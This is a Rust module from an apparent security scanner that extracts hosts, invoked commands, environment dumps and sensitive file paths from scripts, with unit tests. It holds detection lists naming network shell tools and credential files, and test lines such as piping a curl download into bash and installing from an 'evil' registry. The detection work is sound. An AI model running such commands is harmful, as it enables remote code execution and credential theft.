//! Capability derivation.
//!
//! Turns findings and raw code text into a normalized [`Capability`] set, and
//! extracts the shared tokens (URLs, hosts, commands, paths) that both the
//! rules and the capability diff need.
//!
//! Design rule that makes the diff usable (docs/MVP.md §4): **only executable
//! artifacts count as observed capability**. A URL in prose is documentation.
//! Markdown references to `~/.ssh` are explanation; `~/.ssh` in `scripts/` is
//! an access. Getting this wrong is what would sink the diff's precision.

use crate::models::Capability;
use regex::Regex;
use std::collections::BTreeSet;
use std::sync::OnceLock;

/// Compile a regex that is a compile-time constant of this crate.
///
/// A malformed pattern here is a bug in the binary, not hostile input, so it
/// panics at first use rather than degrading silently.
#[allow(clippy::panic)]
fn re(pattern: &str) -> Regex {
    Regex::new(pattern).unwrap_or_else(|e| panic!("built-in regex is invalid: {pattern}: {e}"))
}

fn url_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| re(r#"(?i)\b(?:https?|ftps?)://[^\s'"`)\]}<>]+"#))
}

fn domain_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r#"(?i)\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:com|net|org|io|dev|app|ai|co|sh|cn|ru|xyz|top|info|me|cloud|site|online|live|gg|tv|so|cc|to)\b"#)
    })
}

fn bare_host_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r"(?i)\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:com|net|org|io|dev|app|ai|co|sh|cn|ru|xyz|top|info|me|cloud|site|online|live|gg|tv|so|cc|to)\b")
    })
}

/// Commands that mean "this runs something" or "this reaches the network".
pub const SHELL_BINARIES: &[&str] = &[
    "bash",
    "sh",
    "zsh",
    "ksh",
    "dash",
    "eval",
    "exec",
    "sudo",
    "su",
    "doas",
    "curl",
    "wget",
    "chmod",
    "chown",
    "rm",
    "cp",
    "mv",
    "dd",
    "mkfs",
    "shred",
    "truncate",
    "nc",
    "ncat",
    "netcat",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "git",
    "python",
    "python3",
    "pip",
    "pip3",
    "node",
    "npm",
    "npx",
    "pnpm",
    "yarn",
    "deno",
    "bun",
    "ruby",
    "perl",
    "php",
    "go",
    "cargo",
    "java",
    "javac",
    "powershell",
    "pwsh",
    "cmd",
    "osascript",
    "open",
    "env",
    "printenv",
    "systemctl",
    "crontab",
    "kill",
    "killall",
    "launchctl",
    "docker",
    "kubectl",
    "aws",
    "gcloud",
    "az",
    "terraform",
];

/// Package managers, tracked separately from generic execution because
/// `npm install` from a non-default registry is its own threat.
pub const PACKAGE_MANAGERS: &[&str] = &[
    "npm", "pnpm", "yarn", "bun", "pip", "pip3", "poetry", "uv", "cargo", "go", "gem", "composer",
];

/// Paths whose access is a credential-access signal.
pub const SENSITIVE_PATH_PATTERNS: &[&str] = &[
    r"\.ssh(/|$|\b)",
    r"\.aws(/|$|\b)",
    r"\.gnupg(/|$|\b)",
    r"\.kube(/|$|\b)",
    r"\.docker/config\.json",
    r"\.git-credentials",
    r"\.netrc",
    r"\.npmrc",
    r"\.pypirc",
    r"\.env(\b|$|\.)",
    r"/etc/passwd",
    r"/etc/shadow",
    r"credentials(\.json|\.yml|\.yaml)?\b",
    r"id_rsa",
    r"id_ed25519",
    r"\.config/gcloud",
    r"keychain",
    r"Library/Keychains",
    r"\.claude/settings\.json",
    r"\.claude\.credentials",
];

fn sensitive_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        let alts: Vec<String> = SENSITIVE_PATH_PATTERNS
            .iter()
            .map(|p| format!("(?i){p}"))
            .collect();
        re(&format!("(?:{})", alts.join("|")))
    })
}

pub fn is_sensitive_path(s: &str) -> bool {
    sensitive_re().is_match(s)
}

/// Extract URLs and reduce them to hosts.
pub fn outbound_hosts(text: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for m in url_re().find_iter(text) {
        let raw = m.as_str();
        if let Some(host) = host_of(raw) {
            out.insert(host);
        }
    }
    // Bare hostnames (curl example.com, --host example.com).
    for m in domain_re().find_iter(text) {
        let h = m.as_str().to_ascii_lowercase();
        if !out.contains(&h) {
            out.insert(h);
        }
    }
    out
}

fn host_of(url: &str) -> Option<String> {
    let rest = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
    let authority = rest
        .split(['/', '?', '#'])
        .next()
        .unwrap_or("")
        .rsplit('@')
        .next()
        .unwrap_or("");
    if authority.is_empty() {
        return None;
    }
    // Strip a port, keep IPv6 brackets intact.
    let host = if let Some(bracket_end) = authority.find(']') {
        &authority[..=bracket_end]
    } else {
        authority.split(':').next().unwrap_or("")
    };
    let h = host.to_ascii_lowercase();
    if h.is_empty() {
        None
    } else {
        Some(h)
    }
}

/// Commands invoked on a line. Handles `sudo -E bash`, `| sh`, `&& curl`.
pub fn invoked_commands(line: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for tok in tokenize_shell(line) {
        let base = tok.rsplit('/').next().unwrap_or(&tok).to_ascii_lowercase();
        if SHELL_BINARIES.contains(&base.as_str()) || PACKAGE_MANAGERS.contains(&base.as_str()) {
            out.insert(base);
        }
    }
    out
}

/// Split a line into candidate command tokens: split on shell separators, then
/// take the first word of each segment. Deliberately approximate — it is a
/// heuristic for capability *hints*, and every hit carries evidence.
fn tokenize_shell(line: &str) -> Vec<String> {
    let mut out = Vec::new();
    for seg in split_shell_segments(line) {
        let seg = seg.trim_start_matches(['(', '{', '[']);
        let mut words = seg.split_whitespace();
        let Some(first) = words.next() else { continue };
        let first = first.trim_matches(|c: char| {
            !c.is_ascii_alphanumeric() && c != '-' && c != '.' && c != '_' && c != '/'
        });
        if !first.is_empty() {
            out.push(first.to_owned());
        }
        // `sudo -E rm -rf /`: also record the command after sudo.
        if SHELL_BINARIES.contains(&first.to_ascii_lowercase().as_str()) {
            for w in words.take(3) {
                let w = w.trim_matches(|c: char| {
                    !c.is_ascii_alphanumeric() && c != '-' && c != '.' && c != '_'
                });
                if SHELL_BINARIES.contains(&w.to_ascii_lowercase().as_str()) {
                    out.push(w.to_owned());
                }
            }
        }
    }
    out
}

fn split_shell_segments(line: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let mut start = 0usize;
    let bytes = line.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        let two = if i + 1 < bytes.len() {
            &line[i..i + 2]
        } else {
            ""
        };
        if two == "&&" || two == "||" || two == ";;" || two == "|&" {
            out.push(&line[start..i]);
            i += 2;
            start = i;
            continue;
        }
        let c = bytes[i] as char;
        if c == ';' || c == '|' || c == '\n' {
            out.push(&line[start..i]);
            i += 1;
            start = i;
            continue;
        }
        i += 1;
    }
    out.push(&line[start.min(line.len())..]);
    out
}

/// Environment dumps: `printenv`, `env`, `os.environ`, `$ENV`, `process.env`
/// enumerated rather than read by key.
///
/// The distinction matters. `os.environ['HOME']` reads one variable;
/// `dict(os.environ)` hands every credential the agent holds to whatever comes
/// next. Conflating them is how a scanner loses its credibility.
pub fn dumps_environment(line: &str) -> bool {
    let l = line.to_lowercase();
    if l.contains("printenv") || l.contains("getenv()") {
        return true;
    }
    // `env | tee`, `set | grep`: enumerating into a pipe.
    if l.contains("env |") || l.contains("env|") {
        return true;
    }
    for sym in ["os.environ", "process.env"] {
        let mut from = 0usize;
        while let Some(i) = l[from..].find(sym) {
            let after = &l[from + i + sym.len()..];
            let enumerating = !after.starts_with('[')
                && !after.starts_with(".get")
                && !after.starts_with(".pop")
                && !after.starts_with(".copy()")
                && !(after.starts_with('.') && !after.starts_with(".items()"));
            if enumerating {
                return true;
            }
            from += i + sym.len();
        }
    }
    // Iteration and serialization always mean enumeration.
    l.contains(".items()") && (l.contains("os.environ") || l.contains("process.env"))
        || l.contains("object.keys(") && l.contains("process.env")
        || l.contains("json.stringify") && l.contains("process.env")
}

/// Whether a line reads the environment wholesale (used by capability diff).
pub fn reads_environment(line: &str) -> bool {
    dumps_environment(line)
}

/// Accumulate observed capabilities from an executable artifact's lines.
#[derive(Debug, Default)]
pub struct Accumulator {
    pub cap: Capability,
}

impl Accumulator {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn add_text(&mut self, text: &str) {
        for h in outbound_hosts(text) {
            self.cap.network_outbound.push(h);
        }
        for c in invoked_commands(text) {
            if PACKAGE_MANAGERS.contains(&c.as_str()) {
                self.cap.package_install.push(c);
            } else {
                self.cap.shell_execute.push(c);
            }
        }
        if dumps_environment(text) {
            self.cap.secrets_read = true;
        }
        if sensitive_re().is_match(text) {
            self.cap.secrets_read = true;
        }
        self.collect_paths(text);
    }

    fn collect_paths(&mut self, text: &str) {
        let mut reads = BTreeSet::new();
        let mut writes = BTreeSet::new();
        // URLs are masked out first, preserving length so offsets stay valid.
        // Otherwise the path regex reports `//cdn.example.net/install` as a
        // directory the skill reads.
        let masked = mask_urls(text);
        for m in path_re().find_iter(&masked) {
            let p = normalize_path_token(m.as_str());
            if p.is_empty() {
                continue;
            }
            // A path on the right of a redirect, or next to a write verb, is a
            // write. `open(` is deliberately absent: reading a file with `open`
            // is far more common than writing one, and treating it as a write
            // would misfile most reads.
            let tail = &masked[m.end()..];
            let head = &masked[..m.start()];
            let tail_head = &tail[..tail.len().min(24)];
            let writey = tail_head.trim_start().starts_with('>')
                || head.contains("tee ")
                || head.contains(".write_text")
                || head.contains(".write_bytes")
                || head.contains("writeFileSync")
                || head.contains("f.write(")
                || (head.contains("open(")
                    && (tail_head.contains("\"w")
                        || tail_head.contains("'w")
                        || tail_head.contains("\"a")
                        || tail_head.contains("'a")
                        || tail_head.contains("\"x")));
            if writey {
                writes.insert(p);
            } else {
                reads.insert(p);
            }
        }
        self.cap.filesystem_read.extend(reads);
        self.cap.filesystem_write.extend(writes);
    }

    pub fn finish(self) -> Capability {
        self.cap.normalized()
    }
}

fn path_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        // The last alternative catches separator-less dotfiles such as `.env`.
        // It also matches attribute accesses like `.json`; those are filtered
        // out downstream by `is_config_file`, which is why that check exists.
        re(
            r"(?:~|\.{1,2})?/?(?:[\w.\-]+/){0,6}[\w.\-]+(?:\.[A-Za-z0-9]{1,6})?|\$\{?[A-Z_]{3,}\}?|/[A-Za-z0-9._\-/]{3,}|\.[A-Za-z0-9_][A-Za-z0-9_.\-]{0,19}",
        )
    })
}

/// Replace every URL with dots of the same length, so byte offsets survive and
/// the path regex sees no URL at all.
fn mask_urls(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut last = 0usize;
    for m in url_re().find_iter(text) {
        out.push_str(&text[last..m.start()]);
        for _ in 0..m.len() {
            out.push('.');
        }
        last = m.end();
    }
    out.push_str(&text[last..]);
    out
}

fn normalize_path_token(t: &str) -> String {
    let t = t
        .trim()
        .trim_matches(['"', '\'', '`', ',', ';', ':', ')', '(', '[', ']', '{', '}']);
    if t.is_empty() {
        return String::new();
    }
    // A URL is a network path, not a filesystem path. Without this the path
    // regex reports `//host/install` as a directory the skill reads.
    if t.contains("://") {
        return String::new();
    }
    // Skip bare words and version-like tokens that the path regex over-matches.
    if !t.contains('/') && !t.starts_with('~') && !t.starts_with('$') && !is_config_file(t) {
        return String::new();
    }
    if t.matches('.').count() > 3 {
        return String::new();
    }
    if t.len() < 4 {
        return String::new();
    }
    t.replace('\\', "/")
}

/// Dotfiles that are genuinely paths.
///
/// A bare `.foo` token is ambiguous: in `response.json()` or `req.get(` the
/// path regex sees `.json` and `.get`, which are attribute accesses rather than
/// files. Reporting those as filesystem reads is how a capability diff loses all
/// credibility, so a separator-less token only counts when it is a known config
/// filename.
fn is_config_file(t: &str) -> bool {
    const CONFIG_FILES: &[&str] = &[
        ".env",
        ".envrc",
        ".ssh",
        ".aws",
        ".gnupg",
        ".kube",
        ".npmrc",
        ".netrc",
        ".pypirc",
        ".git-credentials",
        ".docker",
        ".config",
    ];
    CONFIG_FILES.contains(&t.to_ascii_lowercase().as_str())
}

/// Hosts a line contacts, for the declared-vs-observed diff.
pub fn hosts_in(line: &str) -> Vec<String> {
    outbound_hosts(line).into_iter().collect()
}

/// Bare hostnames only, excluding ones that appear as part of a URL.
pub fn bare_hosts(line: &str) -> Vec<String> {
    let url_spans: Vec<(usize, usize)> = url_re()
        .find_iter(line)
        .map(|m| (m.start(), m.end()))
        .collect();
    let mut out = BTreeSet::new();
    for m in bare_host_re().find_iter(line) {
        if url_spans
            .iter()
            .any(|(s, e)| m.start() >= *s && m.end() <= *e)
        {
            continue;
        }
        out.insert(m.as_str().to_ascii_lowercase());
    }
    out.into_iter().collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_hosts_from_urls() {
        let h = outbound_hosts("curl https://api.example.com/v1?x=1 and http://Evil.EXAMPLE.org/y");
        assert!(h.contains("api.example.com"));
        assert!(h.contains("evil.example.org"), "{h:?}");
    }

    #[test]
    fn strips_credentials_and_port_from_url() {
        let h = outbound_hosts("https://user:pw@internal.example.com:8443/path");
        assert!(h.contains("internal.example.com"), "{h:?}");
        assert!(!h.iter().any(|x| x.contains('@')));
    }

    #[test]
    fn finds_bare_hostnames() {
        let h = outbound_hosts("ping example.com -c 1");
        assert!(h.contains("example.com"));
    }

    #[test]
    fn bare_hosts_excludes_url_embedded_hosts() {
        let v = bare_hosts("curl https://a.example.com/x");
        assert!(v.is_empty(), "{v:?}");
        let v2 = bare_hosts("nslookup b.example.com");
        assert_eq!(v2, vec!["b.example.com".to_owned()]);
    }

    #[test]
    fn detects_commands_across_segments() {
        let c = invoked_commands("sudo -E curl https://x.example.com | bash");
        assert!(c.contains("sudo"));
        assert!(c.contains("curl"));
        assert!(c.contains("bash"));
    }

    #[test]
    fn ignores_non_commands() {
        let c = invoked_commands("this is prose about how to use the tool");
        assert!(!c.contains("bash"));
        assert!(!c.contains("sudo"));
    }

    #[test]
    fn separates_package_managers() {
        let mut a = Accumulator::new();
        a.add_text("npm install --registry=https://evil.example.com pkg");
        let cap = a.finish();
        assert!(cap.package_install.contains(&"npm".to_owned()));
        assert!(cap
            .network_outbound
            .contains(&"evil.example.com".to_owned()));
    }

    #[test]
    fn detects_environment_dumps() {
        assert!(dumps_environment("printenv"));
        assert!(dumps_environment("env | grep TOKEN"));
        assert!(dumps_environment("os.environ"));
        assert!(dumps_environment("for k, v in process.env.items()"));
        assert!(!dumps_environment("os.environ['HOME']"));
        assert!(!dumps_environment("environment variable documentation"));
    }

    #[test]
    fn detects_sensitive_paths() {
        assert!(is_sensitive_path("cat ~/.ssh/id_rsa"));
        assert!(is_sensitive_path("cat .env"));
        assert!(is_sensitive_path("open('/etc/passwd')"));
        assert!(!is_sensitive_path("./data/report.csv"));
        assert!(!is_sensitive_path("src/index.ts"));
    }

    #[test]
    fn capability_is_order_independent() {
        let mut a = Accumulator::new();
        a.add_text("curl https://b.example.com");
        a.add_text("curl https://a.example.com");
        let cap = a.finish();
        assert_eq!(cap.network_outbound, vec!["a.example.com", "b.example.com"]);
    }

    #[test]
    fn urls_are_not_reported_as_filesystem_paths() {
        let mut a = Accumulator::new();
        a.add_text("curl -o /tmp/x https://cdn.example.net/install");
        let cap = a.finish();
        assert!(
            !cap.filesystem_read
                .iter()
                .any(|p| p.contains("cdn.example.net")),
            "a URL must not appear as a read path: {:#?}",
            cap.filesystem_read
        );
        assert!(cap.network_outbound.contains(&"cdn.example.net".to_owned()));
    }

    #[test]
    fn attribute_access_is_not_a_filesystem_path() {
        // `response.json()` and `req.get(` look like `.json` and `.get` to a
        // path regex. Reporting those as reads would poison the capability diff.
        let mut a = Accumulator::new();
        a.add_text("response = requests.get(url)\nbody = response.json()");
        let cap = a.finish();
        assert!(
            cap.filesystem_read.is_empty(),
            "attribute access is not a path: {:#?}",
            cap.filesystem_read
        );
    }

    #[test]
    fn known_dotfiles_are_still_paths() {
        let mut a = Accumulator::new();
        a.add_text("token = open('.env').read()");
        let cap = a.finish();
        assert!(
            cap.filesystem_read.iter().any(|p| p == ".env"),
            ".env is a real path: {:#?}",
            cap.filesystem_read
        );
    }
}
